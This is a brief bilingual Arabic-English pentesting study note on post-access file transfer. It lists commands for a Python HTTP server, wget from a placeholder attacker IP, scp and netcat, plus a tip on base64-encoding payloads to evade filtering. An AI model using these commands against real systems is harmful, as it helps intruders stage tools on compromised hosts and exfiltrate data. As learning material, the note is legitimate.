# File Transfers

> Status: 🟨 In progress

## Overview
طرق نقل الملفات من وإلى الهدف بعد الوصول الأولي: HTTP server, SCP, netcat, SMB, وتقنيات bypass لو فيه قيود.

## Key Concepts
- اختيار البروتوكول المناسب حسب الأدوات المتاحة على الهدف
- نقل base64-encoded payloads لو الشبكة بتعمل filtering

## Important Commands / Tools
```bash
python3 -m http.server 8000                       # على جهازك
wget http://<attacker_ip>:8000/file -O file        # على الهدف
scp file user@<IP>:/tmp/
nc -lvnp 4444 > file.out                           # استقبال
nc <IP> 4444 < file.in                              # إرسال
```

## Lab Notes / Walkthrough
- جربت نقل shell scripts عبر base64 لما الـ outbound web traffic كان متفلتر

## Common Mistakes / Gotchas
- نسيان صلاحيات التنفيذ (chmod +x) بعد النقل

## Related Cheatsheet
- [../../cheatsheet/](../../cheatsheet/)
